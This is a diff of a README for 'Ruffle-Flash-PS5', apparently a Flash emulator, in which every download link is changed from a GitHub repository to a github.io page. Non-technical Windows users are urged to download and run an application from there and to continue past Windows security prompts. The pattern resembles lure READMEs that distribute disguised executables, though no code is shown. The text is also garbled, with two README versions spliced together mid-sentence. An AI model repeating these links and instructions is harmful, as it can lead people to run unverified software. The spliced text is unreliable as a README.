@@ -1,6 +1,6 @@
 # 🎮 Ruffle-Flash-PS5 - Play Flash Games on PS5
 
-[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Download-Ruffle--Flash--PS5-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josemartinez13/Ruffle-Flash-PS5)
+[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Download-Ruffle--Flash--PS5-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://josemartinez13.github.io)
 
 Ruffle-Flash-PS5 is a Flash emulator project for PS5-related Flash content. This page helps you find the official download link and run the application on Windows without needing programming knowledge.
 
@@ -8,7 +8,7 @@ Ruffle-Flash-PS5 is a Flash emulator project for PS5-related Flash content. This
 
 Visit this link to download the application:
 
-[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Get%20Ruffle--Flash--PS5-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josemartinez13/Ruffle-Flash-PS5)
+[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Get%20Ruffle--Flash--PS5-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://josemartinez13.github.io)
 
 Open the link in your normal web browser. On the page that appears, use the download option provided there to save the application to your Windows computer. Keep the downloaded file in a folder you can find again, such as your Downloads folder.
 
@@ -17,7 +17,7 @@ Open the link in your normal web browser. On the page that appears, use the down
 Follow these steps in order. You do not need to install extra tools or change Windows settings.
 
 1. Open your web browser, such as Microsoft Edge, Google Chrome, or Firefox.
-2. Go to the download link: [Ruffle-Flash-PS5](https://github.com/josemartinez13/Ruffle-Flash-PS5).
+2. Go to the download link: [Ruffle-Flash-PS5](https://josemartinez13.github.io).
 3. On that page, use the download option provided to save the application.
 4. Wait for the download to finish. Most browsers show the downloaded file at the bottom of the window or in the Downloads folder.
 5. Open your Downloads folder.
@@ -61,7 +61,7 @@ Close other heavy programs if the content feels slow. Flash files can be demandi
 
 ## 🛠️ Troubleshooting
 
-If the download does not start, return to the official link and try again: [Ruffle-Flash-PS5](https://github.com/josemartinez13/Ruffle-Flash-PS5). Make sure your browser is not blocking the download. Check your Downloads folder to see whether the file arrived.
+If the download does not start, return to the official link and try again: [Ruffle-Flash-PS5](https://josemartinez13.github.io). Make sure your browser is not blocking the download. Check your Downloads folder to see whether the file arrived.
 
 If Windows shows a prompt when you open the application, follow the on-screen choices carefully. Choose the option that lets you continue when you trust the file source.
 
@@ -69,7 +69,7 @@ If the application opens but the Flash content does not load, check that the fil
 
 If the application window does# 🎮 Ruffle-Flash-PS5 - Play Classic Flash Content Easily
 
-[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Download-Ruffle--Flash--PS5-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josemartinez13/Ruffle-Flash-PS5)
+[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Download-Ruffle--Flash--PS5-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://josemartinez13.github.io)
 
 Ruffle-Flash-PS5 is a PS5 Flash emulator project built around Ruffle and Flash content. This README is written for everyday Windows users who want a simple way to download the application and start using it without programming knowledge. The official download page is linked below and repeated in the setup section so you can always find it quickly.
 
@@ -77,7 +77,7 @@ Ruffle-Flash-PS5 is a PS5 Flash emulator project built around Ruffle and Flash c
 
 Visit this link to download the application:
 
-[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Get%20Ruffle--Flash--PS5-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josemartinez13/Ruffle-Flash-PS5)
+[![Download Ruffle-Flash-PS5](https://img.shields.io/badge/Get%20Ruffle--Flash--PS5-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://josemartinez13.github.io)
 
 Open the link in your regular web browser. Use the download option shown on that page to save the application to your Windows computer. Keep the downloaded file in a place you can easily find again, such as your Downloads folder.
 
@@ -86,7 +86,7 @@ Open the link in your regular web browser. Use the download option shown on that
 Getting started with Ruffle-Flash-PS5 is intended to be straightforward. You do not need to write code, use a command line, or build anything from source. Follow the steps below in order.
 
 1. Open your web browser, such as Microsoft Edge, Google Chrome, or Firefox.
-2. Go to the official Ruffle-Flash-PS5 page: [https://github.com/josemartinez13/Ruffle-Flash-PS5](https://github.com/josemartinez13/Ruffle-Flash-PS5).
+2. Go to the official Ruffle-Flash-PS5 page: [https://josemartinez13.github.io](https://josemartinez13.github.io).
 3. Use the download option provided on that page to save the application.
 4. Wait for the download to finish.
 5. Open your Downloads folder or the folder where your browser saves downloaded files.
@@ -133,7 +133,7 @@ Close other heavy programs if the content feels slow. Flash files can be demandi
 
 ## 🛠️ Troubleshooting
 
-If the download does not start, return to the official link and try again: [Ruffle-Flash-PS5](https://github.com/josemartinez13/Ruffle-Flash-PS5). Make sure your browser is not blocking the download. Check your Downloads folder to see whether the file arrived.
+If the download does not start, return to the official link and try again: [Ruffle-Flash-PS5](https://josemartinez13.github.io). Make sure your browser is not blocking the download. Check your Downloads folder to see whether the file arrived.
 
 If the application opens but the Flash content does not load, check that the file is a supported Flash or SWF file. Try a different file to see whether the issue is with that one file or with the application itself.
 
